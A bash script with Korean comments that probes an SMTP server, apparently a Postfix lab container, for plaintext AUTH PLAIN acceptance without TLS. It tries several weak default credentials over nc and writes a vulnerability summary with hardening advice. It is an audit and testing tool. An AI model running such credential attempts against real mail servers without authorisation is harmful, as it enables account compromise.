#!/bin/bash
set -e

# AUTH PLAIN 평문 인증 공격 스크립트
# 목표: SMTP 서버가 TLS 없이 평문 인증을 허용하는지 확인

ATTACK_ID="$1"
if [[ -z "$ATTACK_ID" ]]; then
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    ATTACK_ID="AUTHPLAIN-${TIMESTAMP}"
fi

TARGET="mail-postfix"
PORT=25
SUBMISSION_PORT=587
ARTIFACTS_DIR="/artifacts"
TIMEOUT=10

# Base64 인코딩된 테스트 자격증명: test\0test\0test (user\0user\0pass)
AUTH_STRING="dGVzdAB0ZXN0AHRlc3Q="
# 다른 테스트 자격증명들
AUTH_STRING2="dGVzdHVzZXIAdGVzdHVzZXIAdGVzdHBhc3M="  # testuser\0testuser\0testpass
AUTH_STRING3="YWRtaW4AYWRtaW4AYWRtaW4="                # admin\0admin\0admin

echo "INFO: Starting AUTH PLAIN attack - ID: $ATTACK_ID"
echo "INFO: Target: $TARGET:$PORT and $TARGET:$SUBMISSION_PORT"

# 1. 포트 25에서 AUTH 지원 여부 확인
echo "INFO: Checking AUTH support on port 25..."
{
    echo "EHLO test.com"
    sleep 2
    echo "QUIT"
} | timeout $TIMEOUT nc $TARGET $PORT > $ARTIFACTS_DIR/auth_ehlo_25_$ATTACK_ID.txt 2>&1

if grep -q "AUTH" $ARTIFACTS_DIR/auth_ehlo_25_$ATTACK_ID.txt; then
    echo "FOUND: AUTH methods advertised on port 25"
    AUTH_SUPPORTED_25=true
else
    echo "NOT FOUND: No AUTH methods on port 25"
    AUTH_SUPPORTED_25=false
fi

# 2. 포트 587에서 AUTH 지원 여부 확인
echo "INFO: Checking AUTH support on port 587..."
{
    echo "EHLO test.com"
    sleep 2
    echo "QUIT"
} | timeout $TIMEOUT nc $TARGET $SUBMISSION_PORT > $ARTIFACTS_DIR/auth_ehlo_587_$ATTACK_ID.txt 2>&1 || true

if grep -q "AUTH" $ARTIFACTS_DIR/auth_ehlo_587_$ATTACK_ID.txt; then
    echo "FOUND: AUTH methods advertised on port 587"
    AUTH_SUPPORTED_587=true
else
    echo "NOT FOUND: No AUTH methods on port 587"
    AUTH_SUPPORTED_587=false
fi

# 3. 포트 25에서 평문 AUTH PLAIN 시도
echo "INFO: Attempting AUTH PLAIN on port 25 without TLS..."
{
    echo "EHLO attacker.com"
    sleep 1
    echo "AUTH PLAIN $AUTH_STRING"
    sleep 2
    echo "QUIT"
} | timeout $TIMEOUT nc $TARGET $PORT > $ARTIFACTS_DIR/auth_plain_25_$ATTACK_ID.txt 2>&1

# 4. 포트 587에서 평문 AUTH PLAIN 시도
echo "INFO: Attempting AUTH PLAIN on port 587 without TLS..."
{
    echo "EHLO attacker.com"
    sleep 1
    echo "AUTH PLAIN $AUTH_STRING"
    sleep 2
    echo "QUIT"
} | timeout $TIMEOUT nc $TARGET $SUBMISSION_PORT > $ARTIFACTS_DIR/auth_plain_587_$ATTACK_ID.txt 2>&1 || true

# 5. 다양한 자격증명으로 시도 (포트 25)
echo "INFO: Testing multiple credentials on port 25..."
for i in 1 2 3; do
    case $i in
        1) AUTH_TEST="$AUTH_STRING" ;;
        2) AUTH_TEST="$AUTH_STRING2" ;;
        3) AUTH_TEST="$AUTH_STRING3" ;;
    esac
    
    {
        echo "EHLO test$i.com"
        sleep 1
        echo "AUTH PLAIN $AUTH_TEST"
        sleep 2
        echo "QUIT"
    } | timeout $TIMEOUT nc $TARGET $PORT > $ARTIFACTS_DIR/auth_test${i}_$ATTACK_ID.txt 2>&1 || true
done

# 6. 결과 분석
echo "INFO: Analyzing authentication results..."

# 포트 25 분석
if grep -q "235" $ARTIFACTS_DIR/auth_plain_25_$ATTACK_ID.txt; then
    AUTH_ACCEPTED_25=true
    echo "VULNERABLE: AUTH PLAIN accepted on port 25 without TLS!"
elif grep -q "334" $ARTIFACTS_DIR/auth_plain_25_$ATTACK_ID.txt; then
    AUTH_PARTIAL_25=true
    echo "PARTIAL: AUTH PLAIN partially processed on port 25"
else
    AUTH_ACCEPTED_25=false
    echo "SECURE: AUTH PLAIN rejected on port 25"
fi

# 포트 587 분석
if grep -q "235" $ARTIFACTS_DIR/auth_plain_587_$ATTACK_ID.txt; then
    AUTH_ACCEPTED_587=true
    echo "VULNERABLE: AUTH PLAIN accepted on port 587 without TLS!"
elif grep -q "334" $ARTIFACTS_DIR/auth_plain_587_$ATTACK_ID.txt; then
    AUTH_PARTIAL_587=true
    echo "PARTIAL: AUTH PLAIN partially processed on port 587"
else
    AUTH_ACCEPTED_587=false
    echo "SECURE: AUTH PLAIN rejected on port 587"
fi

# 7. TLS 요구사항 확인
echo "INFO: Checking TLS enforcement..."
TLS_REQUIRED=false
if grep -q "530.*TLS" $ARTIFACTS_DIR/auth_plain_25_$ATTACK_ID.txt || 
   grep -q "530.*encryption" $ARTIFACTS_DIR/auth_plain_25_$ATTACK_ID.txt ||
   grep -q "Must issue a STARTTLS" $ARTIFACTS_DIR/auth_plain_25_$ATTACK_ID.txt; then
    TLS_REQUIRED=true
    echo "SECURE: Server requires TLS for authentication"
fi

# 8. 결과 요약 생성
SUMMARY_FILE="$ARTIFACTS_DIR/auth_plain_summary_$ATTACK_ID.txt"
{
    echo "===== AUTH PLAIN Attack Summary ====="
    echo "Attack ID: $ATTACK_ID"
    echo "Target: $TARGET"
    echo "Timestamp: $(date)"
    echo ""
    echo "Results:"
    echo "- AUTH advertised on port 25: $AUTH_SUPPORTED_25"
    echo "- AUTH advertised on port 587: $AUTH_SUPPORTED_587"
    echo "- AUTH PLAIN accepted on port 25: ${AUTH_ACCEPTED_25:-false}"
    echo "- AUTH PLAIN accepted on port 587: ${AUTH_ACCEPTED_587:-false}"
    echo "- TLS required for AUTH: $TLS_REQUIRED"
    echo ""
    
    # 보안 평가
    if [ "$AUTH_ACCEPTED_25" = true ] || [ "$AUTH_ACCEPTED_587" = true ]; then
        echo "SECURITY ASSESSMENT: HIGHLY VULNERABLE"
        echo "- Server accepts plaintext authentication"
        echo "- Credentials can be intercepted in transit"
        echo "- Risk of credential theft and account compromise"
    elif [ "$AUTH_PARTIAL_25" = true ] || [ "$AUTH_PARTIAL_587" = true ]; then
        echo "SECURITY ASSESSMENT: POTENTIALLY VULNERABLE"
        echo "- Server partially processes AUTH commands without TLS"
        echo "- May be exploitable depending on implementation"
    elif [ "$TLS_REQUIRED" = true ]; then
        echo "SECURITY ASSESSMENT: SECURE"
        echo "- Server properly requires TLS for authentication"
    else
        echo "SECURITY ASSESSMENT: MODERATE"
        echo "- No authentication support or properly configured"
    fi
    
    echo ""
    echo "Recommendations:"
    if [ "$AUTH_ACCEPTED_25" = true ] || [ "$AUTH_ACCEPTED_587" = true ]; then
        echo "- Disable plaintext authentication"
        echo "- Require STARTTLS before AUTH commands"
        echo "- Configure 'smtpd_tls_auth_only = yes' in Postfix"
    fi
    
    echo ""
    echo "Artifacts generated:"
    echo "- Port 25 EHLO: auth_ehlo_25_$ATTACK_ID.txt"
    echo "- Port 587 EHLO: auth_ehlo_587_$ATTACK_ID.txt"
    echo "- Port 25 AUTH attempt: auth_plain_25_$ATTACK_ID.txt"
    echo "- Port 587 AUTH attempt: auth_plain_587_$ATTACK_ID.txt"
    echo "- Multiple credential tests: auth_test[1-3]_$ATTACK_ID.txt"
    echo "- Summary: auth_plain_summary_$ATTACK_ID.txt"
} > $SUMMARY_FILE

echo "INFO: AUTH PLAIN attack completed. Summary:"
cat $SUMMARY_FILE

# 9. 상세 로그 출력
echo ""
echo "===== Detailed Results ====="
echo "Port 25 EHLO response:"
cat $ARTIFACTS_DIR/auth_ehlo_25_$ATTACK_ID.txt
echo ""
echo "Port 25 AUTH PLAIN attempt:"
cat $ARTIFACTS_DIR/auth_plain_25_$ATTACK_ID.txt

exit 0
